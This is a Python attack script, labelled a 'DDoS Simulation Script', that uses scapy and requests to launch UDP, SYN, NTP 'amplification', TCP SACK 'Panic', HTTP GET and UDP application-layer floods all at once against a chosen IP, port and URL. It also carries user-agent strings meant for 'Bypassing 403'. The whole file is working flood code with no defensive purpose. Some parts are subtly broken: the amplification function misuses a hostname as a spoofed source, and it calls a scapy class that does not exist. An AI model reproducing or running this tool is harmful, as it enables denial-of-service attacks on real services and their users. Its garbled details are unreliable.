import os
import asyncio
import random
import argparse
import time
from scapy.all import *
import requests
import logging

# Logging Configuration
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# User-Agent for Bypassing 403
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Chrome/131.0.6778.205 (Official Build) (64-bit) (cohort: Stable)"
]

# UDP Flood
async def udp_flood(target_ip, target_port, duration):
    logging.info("[UDP Flood] Attack started.")
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=os.urandom(1024))
        send(packet, verbose=False)
        logging.info("[UDP Flood] Packet sent to %s:%d", target_ip, target_port)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[UDP Flood] Attack finished.")

# NTP Amplification Attack
async def ntp_amplification(target_ip, duration):
    logging.info("[NTP Amplification] Attack started.")
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=target_ip, src="pool.ntp.org")/UDP(dport=123)/Raw(load="\x17\x00\x03\x2a" + b"\x00" * 4)
        send(packet, verbose=False)
        logging.info("[NTP Amplification] Amplified packet sent to %s", target_ip)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[NTP Amplification] Attack finished.")

# SYN Flood
async def syn_flood(target_ip, target_port, duration):
    logging.info("[SYN Flood] Attack started.")
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S", seq=random.randint(0, 65535), window=8192)
        send(packet, verbose=False)
        logging.info("[SYN Flood] SYN packet sent to %s:%d", target_ip, target_port)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[SYN Flood] Attack finished.")

# TCP SACK Panic Attack
async def tcp_sack_panic(target_ip, target_port, duration):
    logging.info("[TCP SACK Panic] Attack started.")
    sack_option = TCPOptions([('SACK', [b"\x00" * 8] * 4)])
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=target_ip)/TCP(dport=target_port, options=sack_option)
        send(packet, verbose=False)
        logging.info("[TCP SACK Panic] SACK packet sent to %s:%d", target_ip, target_port)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[TCP SACK Panic] Attack finished.")

# HTTP GET/POST Flood
async def http_flood(http_target, duration):
    logging.info("[HTTP Flood] Attack started.")
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(http_target, headers=headers)
            logging.info("[HTTP Flood] GET request sent to %s", http_target)
        except requests.exceptions.RequestException:
            logging.warning("[HTTP Flood] Failed to send GET request to %s", http_target)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[HTTP Flood] Attack finished.")

# UDP Application Layer Flood
async def udp_app_flood(target_ip, target_port, duration):
    logging.info("[UDP Application Flood] Attack started.")
    payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load=payload)
        send(packet, verbose=False)
        logging.info("[UDP Application Flood] Application-layer packet sent to %s:%d", target_ip, target_port)
        await asyncio.sleep(0.01)  # Prevent blocking
    logging.info("[UDP Application Flood] Attack finished.")

# Main Function
async def main(args):
    tasks = [
        udp_flood(args.target_ip, args.target_port, args.duration),
        ntp_amplification(args.target_ip, args.duration),
        syn_flood(args.target_ip, args.target_port, args.duration),
        tcp_sack_panic(args.target_ip, args.target_port, args.duration),
        http_flood(args.http_target, args.duration),
        udp_app_flood(args.target_ip, args.target_port, args.duration),
    ]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Simulation Script")
    parser.add_argument("--target-ip", type=str, required=True, help="Target IP address")
    parser.add_argument("--target-port", type=int, required=True, help="Target port")
    parser.add_argument("--http-target", type=str, required=True, help="HTTP target (URL)")
    parser.add_argument("--duration", type=int, required=True, help="Duration of the attack in seconds")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        logging.info("[!] Attack stopped by user.")
